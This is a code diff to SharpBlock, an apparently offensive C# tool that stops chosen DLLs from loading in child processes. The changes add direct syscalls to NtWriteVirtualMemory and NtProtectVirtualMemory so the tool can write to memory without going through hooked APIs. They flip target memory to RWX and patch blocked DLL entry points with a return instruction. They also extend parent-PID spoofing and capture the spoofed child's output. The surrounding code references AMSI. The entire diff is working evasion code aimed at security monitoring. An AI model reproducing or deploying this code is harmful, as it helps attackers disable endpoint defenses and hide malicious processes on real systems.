@@ -21,6 +21,21 @@ namespace SharpBlock {
 
     class Program {
 
+        static IntPtr CurrentProcess = (IntPtr)(-1);
+
+        //SharpSploit.Execution.PE.PE_MANUAL_MAP ntdll = Execute.ManualMap.Map.MapModuleFromDisk(@"c:\windows\system32\ntdll.dll");
+        static Execute.DynamicInvoke.Native.DELEGATES.NtWriteVirtualMemory NtWriteVirtualMemorySysCall;
+        static Execute.DynamicInvoke.Native.DELEGATES.NtProtectVirtualMemory NtProtectVirtualMemorySysCall;
+
+        static Program() {
+            NtWriteVirtualMemorySysCall = GetDelagateForSysCall<Execute.DynamicInvoke.Native.DELEGATES.NtWriteVirtualMemory>(Execute.DynamicInvoke.Generic.GetSyscallStub("NtWriteVirtualMemory"));
+            NtProtectVirtualMemorySysCall = GetDelagateForSysCall<Execute.DynamicInvoke.Native.DELEGATES.NtProtectVirtualMemory>(Execute.DynamicInvoke.Generic.GetSyscallStub("NtProtectVirtualMemory"));
+        }
+
+        static D GetDelagateForSysCall<D>(IntPtr syscallStub) where D : Delegate {
+            return (D)Marshal.GetDelegateForFunctionPointer(syscallStub, typeof(D));
+        }
+
         public struct HostProcessInfo {
             public IntPtr newLoadAddress;
             public IntPtr newEntryPoint;
@@ -63,6 +78,44 @@ namespace SharpBlock {
                 return true;
 
             return false;
+        }
+
+        static bool WriteProcessMemory(IntPtr hProcess, IntPtr baseAddress, byte[] data, int size, out uint bytesWritten) {
+
+            if (IntPtr.Size == 8) {
+                IntPtr regionSize = (IntPtr)size;
+                IntPtr protectionBase = baseAddress;
+                uint oldProtect = 0;
+                bytesWritten = 0;
+                GCHandle pinnedArray = GCHandle.Alloc(data, GCHandleType.Pinned);
+                IntPtr intptrData = pinnedArray.AddrOfPinnedObject();
+
+                uint result = NtProtectVirtualMemorySysCall(hProcess, ref protectionBase, ref regionSize, 0x40 /*RWX*/, ref oldProtect);
+
+                if(result != 0) {
+                    throw new System.ComponentModel.Win32Exception((int)result);
+                }
+
+                result = NtWriteVirtualMemorySysCall(hProcess, baseAddress, intptrData, (uint)size, ref bytesWritten);
+
+                if (result != 0) {
+                    throw new System.ComponentModel.Win32Exception((int)result);
+                }
+
+                result = NtProtectVirtualMemorySysCall(hProcess, ref protectionBase, ref regionSize, oldProtect, ref oldProtect);
+
+                if (result != 0) {
+                    throw new System.ComponentModel.Win32Exception((int)result);
+                }
+
+                return result == 0;
+
+            } else {
+                IntPtr bytesWrittenPtr;
+                bool result = WinAPI.WriteProcessMemory(hProcess, baseAddress, data, size, out bytesWrittenPtr);
+                bytesWritten = (uint)bytesWrittenPtr;
+                return result;
+            }            
         }
 
         static string PatchEntryPointIfNeeded(IntPtr moduleHandle, IntPtr imageBase, IntPtr hProcess) {
@@ -116,11 +169,11 @@ namespace SharpBlock {
                 Console.WriteLine($"[+] Blocked DLL {dllPath}");
 
                 byte[] retIns = new byte[1] { 0xC3 };
-                IntPtr bytesWritten;
+                uint bytesWritten;
 
                 Console.WriteLine("[+] Patching DLL Entry Point at 0x{0:x}", entryPoint.ToInt64());
 
-                if (WinAPI.WriteProcessMemory(hProcess, entryPoint, retIns, 1, out bytesWritten)) {
+                if (WriteProcessMemory(hProcess, entryPoint, retIns, 1, out bytesWritten)) {
                     Console.WriteLine("[+] Successfully patched DLL Entry Point");
                 } else {
                     Console.WriteLine("[!] Failed patched DLL Entry Point with error 0x{0:x}", Marshal.GetLastWin32Error());
@@ -582,19 +635,36 @@ namespace SharpBlock {
             return lpAttributeList;
         }
 
-        private static void SetNewProcessParent(ref STARTUPINFOEX startupInfoEx, int parentProcessId) {
+        private static void SetNewProcessParent(ref STARTUPINFOEX startupInfoEx, int parentProcessId, IntPtr stdOutHandle) {
 
             const int PROC_THREAD_ATTRIBUTE_PARENT_PROCESS = 0x00020000;
             IntPtr handle = WinAPI.OpenProcess(ProcessAccessFlags.CreateProcess | ProcessAccessFlags.DuplicateHandle, false, parentProcessId);
             IntPtr lpValue = Marshal.AllocHGlobal(IntPtr.Size);
             Marshal.WriteIntPtr(lpValue, handle);
 
+            
             bool success = UpdateProcThreadAttribute(startupInfoEx.lpAttributeList, 0, (IntPtr)PROC_THREAD_ATTRIBUTE_PARENT_PROCESS, lpValue,
                                                          (IntPtr)IntPtr.Size, IntPtr.Zero, IntPtr.Zero);
 
+            IntPtr ppidStdOut;                        
+            WinAPI.DuplicateHandle(CurrentProcess, stdOutHandle, handle, out ppidStdOut, 0, true, 3);
+
+            startupInfoEx.StartupInfo.hStdOutput = ppidStdOut;
+            startupInfoEx.StartupInfo.hStdError = ppidStdOut;
+    
             if (!success) {
                 throw new Exception(string.Format($"Error setting [{parentProcessId}] as the parent PID for the new process"));
             }
+        }
+
+        static void StdOutReader(StreamReader sr) {
+
+            try {
+                string line;
+                while ((line = sr.ReadLine()) != null) {
+                    Console.WriteLine(line);
+                }
+            } catch (Exception) { }
         }
 
         static void Main(string[] args) {
@@ -612,7 +682,7 @@ namespace SharpBlock {
             bool showWindow = false;
             int ppid = -1;
             HostProcessInfo hpi = new HostProcessInfo();
-
+            
             Console.WriteLine(
                  "SharpBlock by @_EthicalChaos_\n" +
                  $"  DLL Blocking app for child processes { (IntPtr.Size == 8 ? "x86_64" : "x86")} \n"
@@ -651,6 +721,11 @@ namespace SharpBlock {
 
             try {
 
+                AnonymousPipeServerStream stdOutStream = new AnonymousPipeServerStream(PipeDirection.In, HandleInheritability.Inheritable);
+                StreamReader stdOutReader = new StreamReader(stdOutStream); 
+                stdOutStream.ReadMode = PipeTransmissionMode.Byte;
+                Thread stdOutReaderThread = new Thread(() => StdOutReader(stdOutReader)); 
+ 
                 IntPtr amsiBase = WinAPI.LoadLibrary("amsi.dll");
                 amsiInitalizePtr = WinAPI.GetProcAddress(amsiBase, "AmsiInitialize");
 
@@ -660,31 +735,21 @@ namespace SharpBlock {
                 Console.WriteLine($"[+] in-proc amsi 0x{amsiBase.ToInt64():x16}");
                 Console.WriteLine($"[+] in-proc ntdll 0x{ntdllBase.ToInt64():x16}");
 
-                IntPtr stdOut;
-                IntPtr stdErr;
-                IntPtr stdIn;
-                IntPtr currentProcess = new IntPtr(-1);
-
-                WinAPI.DuplicateHandle(currentProcess, WinAPI.GetStdHandle(StdHandle.STD_OUTPUT_HANDLE), currentProcess, out stdOut, 0, true, 2);
-                WinAPI.DuplicateHandle(currentProcess, WinAPI.GetStdHandle(StdHandle.STD_ERROR_HANDLE), currentProcess, out stdErr, 0, true, 2);
-                WinAPI.DuplicateHandle(currentProcess, WinAPI.GetStdHandle(StdHandle.STD_INPUT_HANDLE), currentProcess, out stdIn, 0, true, 2);
-
                 STARTUPINFOEX startupInfo = new STARTUPINFOEX();
                 startupInfo.StartupInfo.cb = (uint)Marshal.SizeOf(startupInfo);
                 uint launchFlags = WinAPI.DEBUG_PROCESS;
 
                 if (!showWindow) {
                     startupInfo.StartupInfo.dwFlags = 0x00000101;
-                    startupInfo.StartupInfo.hStdOutput = stdOut;
-                    startupInfo.StartupInfo.hStdError = stdErr;
-                    startupInfo.StartupInfo.hStdInput = stdIn;
                     launchFlags |= 0x08000000;
                 }
 
                 if (ppid > 0) {
                     launchFlags |= 0x80000;
+                    startupInfo.StartupInfo.dwFlags |= 0x101;
                     startupInfo.lpAttributeList = InitializeProcThreadAttributeList(1);
-                    SetNewProcessParent(ref startupInfo, ppid);    
+                    SetNewProcessParent(ref startupInfo, ppid, stdOutStream.ClientSafePipeHandle.DangerousGetHandle());
+                    stdOutReaderThread.Start();
                 }
 
                 PROCESS_INFORMATION pi = new PROCESS_INFORMATION();
@@ -836,9 +901,16 @@ namespace SharpBlock {
                 }
 
                 int exitCode;
-                WinAPI.GetExitCodeProcess(pi.hProcess, out exitCode);
+                WinAPI.GetExitCodeProcess(pi.hProcess, out exitCode);                
                 Console.WriteLine($"[+] Process {program} with PID {pi.dwProcessId} exited wit code {exitCode:x}");
-
+                
+                if (stdOutReaderThread.IsAlive) {
+                    stdOutReader.Close();
+                    stdOutStream.Close();
+                    //Ugly exit due to std out pipe causing hang inside thread
+                    Environment.Exit(0);
+                }
+                   
             }catch(Exception e) {
                 Console.WriteLine($"[!] SharpBlock failed with error {e.Message}");
                 Console.WriteLine(e.StackTrace);
